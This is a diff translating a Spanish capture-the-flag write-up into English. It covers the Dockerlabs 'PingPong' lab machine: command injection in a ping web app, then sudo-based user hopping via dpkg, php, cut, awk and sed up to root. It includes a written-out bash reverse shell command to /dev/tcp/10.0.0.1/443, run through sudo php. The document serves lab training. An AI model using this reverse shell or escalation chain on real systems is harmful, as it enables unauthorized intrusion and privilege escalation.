@@ -1,19 +1,19 @@
 # PingPong
 
-Máquina vulnerable en modo **medium** de Dockerlabs.
+<center><img src="https://dockerlabs.es/static/images/logos/logo.png" width="150px"></center>
 
-- [Reconocimiento](#reconocimiento)
-- [Escaneo](#escaneo)
-- [Enumeración](#enumeración)
-- [Explotación](#explotación)
-- [Escalada de privilegios](#escalada-de-privilegios)
+## Contents
 
-<br/>
+- [Reconnaissance](#reconnaissance)
+- [Scanning](#scanning)
+- [Enumeration](#enumeration)
+- [Exploitation](#exploitation)
+- [Privilege Escalation](#privilege-escalation)
 
-## Reconocimiento
+## Reconnaissance
 
-La máquina objetivo se encuentra correctamente desplegada dentro de la red de laboratorio (en este caso, utilizando Docker).  
-Para identificarla se realizó el uso de `arp-scan` para identificar los dispositivos en nuestra red docker con la interfaz `docker0`
+The target machine is correctly deployed inside the lab network (in this case, using Docker).  
+To identify it, `arp-scan` was used to find devices in our Docker network using the `docker0` interface.
 
 ```bash
 sudo arp-scan -I docker0 --localnet
@@ -22,66 +22,58 @@ Starting arp-scan 1.10.0 with 65536 hosts (https://github.com/royhills/arp-scan)
 172.17.0.2	02:42:ac:11:00:02	(Unknown: locally administered)
 ```
 
-<br/>
+## Scanning
 
-## Escaneo
-
-Se realizó un escaneo con **Nmap** para identificar puertos abiertos y servicios:
+A scan was performed using **Nmap** to identify open ports and running services:
 
 ```bash
 nmap -p- --open -sC -sV --min-rate 5000 -n -Pn 172.17.0.2
 ```
 
-El **target** corresponde a la IP de la máquina víctima: **172.17.0.2**
+The **target** corresponds to the victim machine’s IP: **172.17.0.2**
 
-Resultados principales:
+Main results:
 
-- Puerto **80** abierto (Apache)
-- Puerto **443** abierto (Apache)
-- Puerto **5000** abierto corriendo una aplicación en Python (Werkzeug).
+- Port **80** open (Apache)
+- Port **443** open (Apache)
+- Port **5000** open running a Python application (Werkzeug)
 
 ![Scan1](https://i.imgur.com/racpOYG.png)
 
-<br/>
+## Enumeration
 
-## Enumeración
-
-Se hizo una revisión de los puertos **80** y **433** en el navegador pero los servidores no suministraron información relevante.
+Ports **80** and **443** were checked in the browser, but the servers did not provide relevant information.
 
 ![Scan1](https://i.imgur.com/YS628ZP.png)
 
-El siguiente paso fue buscar directorios y recursos ocultos con **Gobuster**:
+The next step was to search for hidden directories and resources using **Gobuster**:
 
 ```bash
-gobuster dir -u "http://172.17.0.2"   -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   -t 20 -x php,txt,html,php.bak
+gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html,php.bak
 ```
 
-El resultado no arrojó muchos directorios, se inspeccionó el `machine.php` pero tampoco mostró nada relevante.
+The result didn’t show many directories; `machine.php` was inspected, but nothing relevant was found.
 
 ![Gobuster](https://i.imgur.com/JJOzxTm.png)
 ![Machine](https://i.imgur.com/yod5G0O.png)
 
-Se pasó al puerto **5000** donde se hayó una aplicación para realizar pings a hosts pasados por medio de un input HTML, al parecer no sanitizado. Debido a esto se realizaron pruebas de **Command injection** para así conseguir obtener información de la máquina.
+Then we moved to port **5000**, where we found an application that performs ping requests to hosts via an HTML input — apparently unsanitized. Because of this, **Command Injection** tests were conducted to extract system information.
 
 ![Werkzeug1](https://i.imgur.com/37eesfV.png)
 ![Werkzeug1](https://i.imgur.com/MY85DKb.png)
 
-<br/>
+## Exploitation
 
-## Explotación
-
-Gracias a que los resultados fueron positivos, se implementó una reverse shell con bash para conectar a la terminal.
+Since the results were positive, a **reverse shell** using Bash was executed to gain terminal access.
 
 ![Werkzeug1](https://i.imgur.com/s6zQY5h.png)  
 ![Werkzeug2](https://i.imgur.com/sW9IsW7.png)
 
-<br/>
+## Privilege Escalation
 
-## Escalada de privilegios
+After establishing the reverse shell, the environment was analyzed to determine how to escalate privileges.
 
-Después de implementar la reverse shell se analizó el entorno para validar cómo conseguir la escalada de privilegios.
-
-Se buscaron binarios con permisos SUID:
+SUID binaries were searched for:
 
 ```bash
 find / -perm -4000 2>/dev/null
@@ -89,21 +81,21 @@ find / -perm -4000 2>/dev/null
 
 ![SUID](https://i.imgur.com/PPXa0is.png)
 
-Aunque algunos binarios no eran explotables, se observó `/usr/bin/dpkg` se puede ejecutar con el usuario `bobby`, lo que sugiere un movimiento lateral. En [GTFObins](https://gtfobins.github.io/gtfobins/dpkg/#sudo) podemos observar cómo ejecutar el dpkg.
+Although some binaries weren’t exploitable, it was observed that `/usr/bin/dpkg` could be executed by the user `bobby`, suggesting a possible **lateral movement**. According to [GTFObins](https://gtfobins.github.io/gtfobins/dpkg/#sudo), we can see how to leverage `dpkg`.
 
-Efectuamos ajustes en nuestro términal para evitar errores de list al ejecutar los comandos:
+Some adjustments were made to the terminal to avoid errors when executing commands:
 
 ```
 - script /dev/null -c bash
 - stty raw -echo; fg
 	reset xterm
-- CTRL + z para pasarla background
+- CTRL + z to background the shell
 - export TERM=xterm
 - export SHELL=bash
-- stty rows 47 colums 189
+- stty rows 47 columns 189
 ```
 
-Al ejecutar los comandos para usar el dpkg:
+Running the commands to use `dpkg`:
 
 ```bash
 sudo -u bobby /usr/bin/dpkg -l
@@ -112,27 +104,31 @@ sudo -u bobby /usr/bin/dpkg -l
 ![dpkg](https://i.imgur.com/YaJalta.png)
 ![dpkg](https://i.imgur.com/VKCKnWA.png)
 
-Conseguido el usuario `bobby` Se repite el mismo proceso de comprobación de binarios y obtenemos lo siguiente para usuario `gladys`
+After obtaining the `bobby` user, the same binary check process was repeated, leading to the discovery of another user: `gladys`.
 
 ![dpkg](https://i.imgur.com/3JNwdWo.png)
 
-Se ejecuta el CMD en php para ejecutar otra reverse shell y conectarnos a `gladys`
+A PHP command was executed to launch another **reverse shell** and connect as `gladys`:
 
-`CMD='/bin/bash -c \ 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1\'`
-`sudo -u gladys /usr/bin/php -r "system('$CMD');"`
+```bash
+CMD='/bin/bash -c \'bash -i >& /dev/tcp/10.0.0.1/443 0>&1\''
+sudo -u gladys /usr/bin/php -r "system('$CMD');"
+```
 
-Con esto pasamos al usuario `gladys` nuevamente se vuelve a repetir el proceso de comprobación, siempre utilizando searchbins o GTFObins en este caso el de [cut](https://gtfobins.github.io/gtfobins/cut/#sudo). Al revisar el directorio `/opt/` se encontró una flag que se utilizó para pasar al siguiente usuario `chocolatito`.
+Now as `gladys`, the process was repeated, using [GTFObins](https://gtfobins.github.io/gtfobins/cut/#sudo) to check for exploitable binaries. In the `/opt/` directory, a flag was found that was used to move to the next user: `chocolatito`.
 
 ![dpkg](https://i.imgur.com/Iuf675b.png)
 
-Obteniendo el usuario de `chocolatito` se vuelve a comprobar y se buscan nuevos binarios, en este caso es [awk](https://gtfobins.github.io/gtfobins/awk/#sudo). Que nos permite pasar al siguiente usuario que es `theboss`
+After obtaining the `chocolatito` user, new binaries were searched again, and in this case, [awk](https://gtfobins.github.io/gtfobins/awk/#sudo) allowed escalation to the next user: `theboss`.
 
 ![dpkg](https://i.imgur.com/ZeyEw1O.png)
 
-Utilizando el método de comprobación como las veces anteriores, se descubre que este usuario en particular puede dar vía libre al root por medio de [sed](https://gtfobins.github.io/gtfobins/sed/#sudo).
+Using the same method, it was found that this particular user could finally gain **root** access through [sed](https://gtfobins.github.io/gtfobins/sed/#sudo).
 
 ![dpkg](https://i.imgur.com/ItDzxDz.png)
 
-Y es con esto que después de realizar tantos movimientos laterales, se consigue escalar al root.
+After performing several lateral movements, **root** was finally obtained.
+
+---
 
 _Written by **kur0bai**_
